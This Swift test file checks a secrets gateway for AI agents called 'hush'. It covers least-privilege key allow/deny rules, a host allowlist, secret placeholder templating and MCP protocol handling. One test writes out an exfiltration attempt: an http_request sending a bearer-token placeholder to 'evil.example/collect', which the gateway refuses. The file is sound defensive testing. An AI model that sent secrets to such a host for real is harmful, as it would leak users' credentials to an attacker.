import XCTest
@testable import hush

/// Least-privilege policy: an agent gets only the keys it's granted, and a secret
/// can only be sent to an allowlisted host.
final class GatewayPolicyTests: XCTestCase {
    private func policy(allow: [String] = [], deny: [String] = [], hosts: [String] = []) -> GatewayPolicy {
        GatewayPolicy(allow: allow, deny: deny, httpAllowHosts: hosts, present: true)
    }

    func testNoAllowlistServesAllKeys() {
        XCTAssertTrue(policy().allowsKey("DATABASE_URL"))
        XCTAssertTrue(policy().allowsKey("ANYTHING"))
    }

    func testAllowlistRestricts() {
        let p = policy(allow: ["DATABASE_URL", "DB_PASSWORD"])
        XCTAssertTrue(p.allowsKey("DATABASE_URL"))
        XCTAssertFalse(p.allowsKey("AWS_SECRET_ACCESS_KEY"))
    }

    func testDenyWinsOverAllow() {
        let p = policy(allow: ["DATABASE_URL", "AWS_SECRET_ACCESS_KEY"], deny: ["AWS_SECRET_ACCESS_KEY"])
        XCTAssertTrue(p.allowsKey("DATABASE_URL"))
        XCTAssertFalse(p.allowsKey("AWS_SECRET_ACCESS_KEY"))
    }

    func testWildcards() {
        let p = policy(allow: ["DB_*"], deny: ["DB_ADMIN_*"])
        XCTAssertTrue(p.allowsKey("DB_URL"))
        XCTAssertTrue(p.allowsKey("DB_PASSWORD"))
        XCTAssertFalse(p.allowsKey("DB_ADMIN_TOKEN"), "deny wildcard must win")
        XCTAssertFalse(p.allowsKey("AWS_KEY"))
    }

    func testHostAllowlistDefaultsToDeny() {
        XCTAssertFalse(policy().allowsHost("api.stripe.com"), "empty allowlist must deny every host")
        XCTAssertTrue(policy(hosts: ["api.stripe.com"]).allowsHost("api.stripe.com"))
        XCTAssertFalse(policy(hosts: ["api.stripe.com"]).allowsHost("evil.com"))
        XCTAssertTrue(policy(hosts: ["*.internal.example"]).allowsHost("svc.internal.example"))
        XCTAssertFalse(policy(hosts: ["*.internal.example"]).allowsHost("evil.example"))
    }

    func testLoadFromFile() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("hush-pol-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let json = #"{"allow":["DB_*"],"deny":["DB_ADMIN"],"http_allow_hosts":["api.x.com"]}"#
        try json.write(to: dir.appendingPathComponent(".hushmcp.json"), atomically: true, encoding: .utf8)
        let p = GatewayPolicy.load(projectDir: dir.path)
        XCTAssertTrue(p.present)
        XCTAssertTrue(p.allowsKey("DB_URL"))
        XCTAssertFalse(p.allowsKey("DB_ADMIN"))
        XCTAssertTrue(p.allowsHost("api.x.com"))
    }

    func testMissingFileServesKeysButNeverSendsToAnyHost() {
        let p = GatewayPolicy.load(projectDir: "/nonexistent-\(UUID().uuidString)")
        XCTAssertFalse(p.present)
        XCTAssertTrue(p.allowsKey("ANYTHING"), "no policy → keys are servable")
        XCTAssertFalse(p.allowsHost("evil.com"), "no policy → never send a secret onto the network")
    }
}

/// Reference-handle substitution: the model writes `{{secret:NAME}}`, the gateway
/// fills it server-side. Pure string handling, so it's fully testable.
final class SecretTemplatingTests: XCTestCase {
    func testReferencedNames() {
        XCTAssertEqual(SecretTemplating.referencedNames(in: "Bearer {{secret:API_KEY}}, db {{secret:DB_URL}}"),
                       ["API_KEY", "DB_URL"])
    }

    func testSubstituteSingle() {
        let r = SecretTemplating.substitute(in: "Bearer {{secret:API_KEY}}", lookup: { $0 == "API_KEY" ? "sk_live_123" : nil })
        XCTAssertEqual(r.result, "Bearer sk_live_123")
        XCTAssertEqual(r.used, ["API_KEY"])
        XCTAssertTrue(r.missing.isEmpty)
    }

    func testSubstituteMultipleWithMissing() {
        let r = SecretTemplating.substitute(in: "{{secret:A}}-{{secret:B}}-{{secret:C}}",
                                            lookup: { ["A": "1", "C": "3"][$0] })
        XCTAssertEqual(r.result, "1-{{secret:B}}-3", "a missing name is left intact, not blanked")
        XCTAssertEqual(r.used, ["A", "C"])
        XCTAssertEqual(r.missing, ["B"])
    }

    func testNoPlaceholdersUnchanged() {
        let r = SecretTemplating.substitute(in: "plain text", lookup: { _ in "x" })
        XCTAssertEqual(r.result, "plain text")
        XCTAssertTrue(r.used.isEmpty)
    }
}

/// Protocol scaffolding and the gateway's pre-decryption refusals — the paths that
/// run without a Touch ID prompt, so they're scriptable.
final class MCPServerTests: XCTestCase {
    private func server(_ dir: String = "/tmp") -> MCP.Server { MCP.Server(projectDir: dir, file: ".hush") }

    private func toolText(_ resp: [String: Any]?) -> String {
        let result = resp?["result"] as? [String: Any]
        return ((result?["content"] as? [[String: Any]])?.first?["text"] as? String) ?? ""
    }
    private func isError(_ resp: [String: Any]?) -> Bool {
        ((resp?["result"] as? [String: Any])?["isError"] as? Bool) ?? false
    }

    func testInitializeEchoesProtocolVersion() {
        let resp = server().handle(["jsonrpc": "2.0", "id": 1, "method": "initialize",
                                    "params": ["protocolVersion": "2025-06-18"]])
        let result = resp?["result"] as? [String: Any]
        XCTAssertEqual(result?["protocolVersion"] as? String, "2025-06-18")
        XCTAssertNotNil(result?["serverInfo"])
        XCTAssertEqual(resp?["id"] as? Int, 1)
    }

    func testToolsListExposesThreeTools() {
        let resp = server().handle(["jsonrpc": "2.0", "id": 2, "method": "tools/list"])
        let tools = (resp?["result"] as? [String: Any])?["tools"] as? [[String: Any]]
        XCTAssertEqual(Set(tools?.compactMap { $0["name"] as? String } ?? []),
                       ["list_secrets", "get_secret", "http_request"])
    }

    func testInitializedNotificationGetsNoResponse() {
        XCTAssertNil(server().handle(["jsonrpc": "2.0", "method": "notifications/initialized"]))
    }

    func testUnknownMethodReturnsJSONRPCError() {
        let resp = server().handle(["jsonrpc": "2.0", "id": 3, "method": "does/not/exist"])
        XCTAssertNotNil(resp?["error"])
    }

    func testGetSecretRequiresName() {
        let resp = server().handle(["jsonrpc": "2.0", "id": 4, "method": "tools/call",
                                    "params": ["name": "get_secret", "arguments": [String: Any]()]])
        XCTAssertTrue(isError(resp))
    }

    /// Least-privilege end-to-end at the gateway boundary: a denied key is refused
    /// *before* any decryption, so no Touch ID and no plaintext are ever reached.
    func testGetSecretDeniedByPolicyNeverDecrypts() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("hush-mcp-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        try #"{"deny":["AWS_SECRET_ACCESS_KEY"]}"#.write(to: dir.appendingPathComponent(".hushmcp.json"),
                                                         atomically: true, encoding: .utf8)
        let resp = MCP.Server(projectDir: dir.path, file: ".hush").handle([
            "jsonrpc": "2.0", "id": 5, "method": "tools/call",
            "params": ["name": "get_secret", "arguments": ["name": "AWS_SECRET_ACCESS_KEY"]],
        ])
        XCTAssertTrue(isError(resp))
        XCTAssertTrue(toolText(resp).contains("denied"))
    }

    /// A reference-handle request to a host that isn't allowlisted is refused
    /// before decryption — a compromised agent can't redirect a secret to its own
    /// host even with a valid placeholder.
    func testHttpRequestToUnallowlistedHostRefused() {
        let resp = server("/nonexistent-\(UUID().uuidString)").handle([
            "jsonrpc": "2.0", "id": 6, "method": "tools/call",
            "params": ["name": "http_request", "arguments": [
                "url": "https://evil.example/collect",
                "headers": ["Authorization": "Bearer {{secret:API_KEY}}"],
            ]],
        ])
        XCTAssertTrue(isError(resp))
        XCTAssertTrue(toolText(resp).lowercased().contains("denies") || toolText(resp).contains("evil.example"))
    }
}
